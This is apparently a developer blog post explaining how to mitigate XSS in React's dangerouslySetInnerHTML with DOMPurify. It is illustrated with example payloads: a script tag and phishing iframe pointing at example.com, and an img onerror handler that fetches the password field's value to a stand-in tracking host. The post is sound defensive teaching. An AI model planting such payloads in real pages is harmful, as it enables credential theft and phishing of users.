---
title: Mitigate XSS exploits when using React's dangerously​SetInnerHTML
description: With the great power of dangerously​SetInnerHTML, comes great responsibility
posted: "2022-08-14"
updated: "2022-08-14"
image: https://res.cloudinary.com/dg1mbzzfx/image/upload/v1668098134/TimBryan.dev/posts/lautaro-andreani-xkBaqlcqeb4-unsplash_hcdccc.jpg
credit:
  [
    Lautaro Andreani,
    https://unsplash.com/@lautaroandreani?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText,
  ]
status: published
---

**TL: DR;** Blinding dumping content into `dangerously​SetInnerHTML` is exactly that - dangerous. Make sure you are sanitising any input you pass to dangerously​SetInnerHTML unless you have explicit control of the input.

The following component serves as a simple example of mitigating the risk of an XSS attack via dangerously​SetInnerHTML:

```jsx title="DangerousHtml.jsx"
//https://github.com/cure53/DOMPurify
import React from "react";
import DOMPurify from "dompurify";

const sanitize = (dirty) => DOMPurify.sanitize(dirty);

const DangerousHtml = ({ innerHTML, tag }) => {
  const clean = sanitize(innerHTML);

  if (typeof tag === "undefined") {
    return <div dangerouslySetInnerHTML={{ __html: clean }} />;
  }
  return <tag dangerouslySetInnerHTML={{ __html: clean }} />;
};

export default DangerousHtml;
```

By using our bespoke `DangerousHtml` component, we can dramatically reduce the risk of an XSS exploit as we're sanitising our input before it gets to the actual `dangerously​SetInnerHTML` prop

`DOMPurify` is highly configurable too, so it might be the case that you want to have multiple components like our example to handle specific use cases or allow some of the below examples explicitly.

Below are some brief examples of how the exploits could take place:

## Exploiting iFrame and Script Tags

XSS is possible as React will not strip out the script tag which points to a malicious payload.

We really shouldn't be passing iFrames in this way either. Rather, we should pass the URL and any other "safe" attributes as a props and render it ourselves in an iFrame tag to retain control of it's rendering ability's and source, or have a dedicated iFrame component.

For example, consider rhe following malicious markup that we've received from an API request. If we blindly set it via _dangerously​SetInnerHTML_, we'll give the user this output:

```jsx
// Bad markup going in
<div
  dangerouslySetInnerHTML={{
    __html: `<p>
  Hi
  <script src="https://example.com/malicious-tracking"></script>
  Fiona, here is the link to enter your bank details:
  <iframe src="https://example.com/defo-not-the-actual-bank"></iframe>
</p>`,
  }}
/>
```

```html
<!-- Bad markup rendered on the DOM -->
<div>
  <p>
    Hi
    <script src="https://example.com/malicious-tracking"></script>
    Fiona, here is the link to enter your bank details:
    <iframe src="https://example.com/defo-not-the-actual-bank"></iframe>
  </p>
</div>
```

However, using our DangerousHTML component instead, means that we have mitigated most of the risk the user may have faced:

```jsx
// Bad markup going in
<DangerousHtml
  innerHTML={`<p>
  Hi
  <script src="https://example.com/malicious-tracking"></script>
  Fiona, here is the link to enter your bank details:
  <iframe src="https://example.com/defo-not-the-actual-bank"></iframe>
</p>`}
/>
```

```html
<!-- Clean markup rendered on the DOM -->
<div>
  <p>Hi Fiona, here is the link to enter your bank details:</p>
</div>
```

Fiona may think that the website is broken or missing content for some reason - but this is still better than being phished for their bank details!

## Attribute manipulation/poisoning

Some DOM elements have special attributes that we can abuse that we should protect ourselves against.

In this example, we can run some JS on an `<image>` tag's `onerror`.

For example, given the following:

```jsx
// Bad markup going in
<div
  dangerouslySetInnerHTML={{
    __html: `
<p>
  Hola
  <img
    src='none.png'
    onerror='fetch("https://example.com/malicious-tracking?password=" + document.querySelector("input#password").value);'
  />
  Sharon
</p>`,
  }}
/>
```

```html
<!-- Bad markup rendered on the DOM -->
<div>
  <p>
    Hola
    <img
      src="none.png"
      onerror='fetch("https://example.com/malicious-tracking?password=" + document.querySelector("input#password").value);'
    />
    Sharon
  </p>
</div>
```

In this instance, our poisoned markup is stealing data from the DOM when the image request eventually fails and the user will never even know.

We can mitigate this again with our DangerousHtml component

```jsx
// Bad markup going in
<DangerousHtml
  innerHTML={`
<p>
  Hola
  <img
    src='none.png'
    onerror='fetch("https://example.com/malicious-tracking?password=" + document.querySelector("input#password").value);'
  />
  Sharon
</p>`}
/>
```

```html
<!-- Clean markup rendered on the DOM -->
<div>
  <p>
    Hola
    <img src="none.png" />
    Sharon
  </p>
</div>
```

Given the argument that we may genuinely want to execute some JS to show a fallback image, we should again not be trusting raw, unsanitized HTML to do this for us and would be better served either having a `fallbackImageURL` or `onError` prop that we can explicitly add to our image tag like so:

```jsx
// Usual imports
const MyImageComponent = ({ fallbackUrl, url }) => {
  // Usual component setup

  const displayFallbackImage = (evt) => {
    // If there is no fallback, do nothing
    if (!fallbackUrl) return;

    // set the url to the fallbackUrl
    evt.target.src = fallbackUrl;
  };

  return (
    <img
      src={url}
      onerror={displayFallbackImage}
      // ... any other props
    />
  );
};
```
